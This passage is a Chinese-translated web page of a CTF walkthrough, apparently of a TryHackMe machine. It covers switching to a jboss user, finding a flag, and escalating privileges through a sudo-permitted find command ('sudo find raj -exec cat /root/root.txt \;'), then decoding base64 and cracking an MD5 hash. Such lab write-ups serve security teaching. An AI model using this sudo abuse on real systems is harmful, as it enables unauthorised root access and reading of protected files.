ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">su jboss</code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nj"><img src="../Images/76cf7a045aa0354bbcfe28c75d9bd0bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sU4SX4IJwdUCYhOmkK7C-A.png"/></div></div></figure><p id="d5af" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好了，现在我们需要找到jboss用户的标志</p><p id="5f11" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">让我们看看jboss用户目录中的隐藏文件</p><p id="102d" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">ls -la</code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nk"><img src="../Images/8f675d30787c71c7888266b10758a589.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ByzgrwmY_bjHZmRA_n2_Rw.png"/></div></div></figure><p id="d407" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">我们看到了一个有趣的文本文件。让我们来看看</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nj"><img src="../Images/69bcf8daf9927acd66d53521699699b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t-2BWMqKoVC5HZ4rYoeJEw.png"/></div></div></figure><p id="7edc" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">我们在那里拿到了旗子</p><p id="d93d" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">现在我们需要得到超级用户的根标志，让我们检查一下作为用户“jboss ”,我们可以用超级用户权限在系统上运行什么命令</p><p id="484e" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">sudo -l</code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/835845b5d30b7e887faffeb02ae07ff8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Mf3JFUUVWDFeqJkR3hHJ5A.png"/></div></div></figure><p id="9147" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">我们可以root cool身份运行<code class="fe na nb nc mc b">find</code>命令，我们可以用它来提升权限</p><p id="3646" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">为此，我们可以参考黑客博客中关于使用<code class="fe na nb nc mc b">find</code>命令提升权限的文章</p><p id="de7c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">link-<a class="ae ln" href="https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">https://www . hacking articles . in/Linux-for-pentester-find-privilege-escalation/</a></p><p id="19fb" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">运行此命令查看根标志</p><p id="da3f" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">touch raj</code></p><p id="096c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">sudo find raj -exec cat /root/root.txt \;</code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/76475e6c611dd82fc2ebe189644b003b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DRNd0jf0hSkAAZrMRbdP7w.png"/></div></div></figure><p id="be85" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好吧，但这不是一个标志(虽然在挑战中提到最后一个标志不是THM{}格式，但这是base64编码，而不是任何文本)</p><p id="196a" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">让我们解码这个base64数据</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/b392af62fa2efa70e6f8d8b8910e1467.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RRem4PxPOQFonNJBgNZ01g.png"/></div></div></figure><p id="df50" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好了，我们又得到了一个散列值，看起来像md5，让我们用破解站来破解它</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nl"><img src="../Images/7a0e6319582832c889bc3d9e49c9574e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d4k0Xcf_shS6DpYiYH_bmw.png"/></div></div></figure><p id="f6d4" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">瞧啊。！我们拿到了我们的根旗</p><p id="5bf7" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">作者:infosec_boy</p><div class="nm nn gp gr no np"><a href="https://www.linkedin.com/in/anubhav-mandarwal-318952186/" rel="noopener  ugc nofollow" target="_blank"><div class="nq ab fo"><div class="nr ab ns cl cj nt"><h2 class="bd ir gy z fp nu fr fs nv fu fw ip bi translated">anubhav mandarwal -副威胁研究员-网络| LinkedIn</h2><div class="nw l"><h3 class="bd b gy z fp nu fr fs nv fu fw dk translated">查看anubhav mandarwal在世界上最大的职业社区LinkedIn上的个人资料。anubhav有3份工作列在…</h3></div><div class="nx l"><p class="bd b dl z fp nu fr fs nv fu fw dk translated">www.linkedin.com</p></div></div><div class="ny l"><div class="nz l oa ob oc ny od lu np"/></div></div></a></div><div class="nm nn gp gr no np"><a href="https://twitter.com/infosec_boy" rel="noopener  ugc nofollow" target="_blank"><div class="nq ab fo"><div class="nr ab ns cl cj nt"><h2 class="bd ir gy z fp nu fr fs nv fu fw ip bi translated">阿努巴夫·曼德瓦尔</h2><div class="nw l"><h3 class="bd b gy z fp nu fr fs nv fu fw dk translated">anubhav mandarwal的最新推文(@infosec_boy)。一个喜欢摆弄机器和捕捉虫子的人💻…</h3></div><div class="nx l"><p class="bd b dl z fp nu fr fs nv fu fw dk translated">twitter.com</p></div></div><div class="ny l"><div class="oe l oa ob oc ny od lu np"/></div></div></a></div><div class="nm nn gp gr no np"><a href="https://www.instagram.com/infosec_boy/" rel="noopener  ugc nofollow" target="_blank"><div class="nq ab fo"><div class="nr ab ns cl cj nt"><h2 class="bd ir gy z fp nu fr fs nv fu fw ip bi translated">登录* Instagram</h2><div class="nw l"><h3 class="bd b gy z fp nu fr fs nv fu fw dk translated">欢迎回到Instagram。登录查看您的朋友、家人和兴趣爱好捕捉和分享了什么…</h3></div><div class="nx l"><p class="bd b dl z fp nu fr fs nv fu fw dk translated">www.instagram.com</p></div></div></div></a></div></div></div>    
</body>
</html>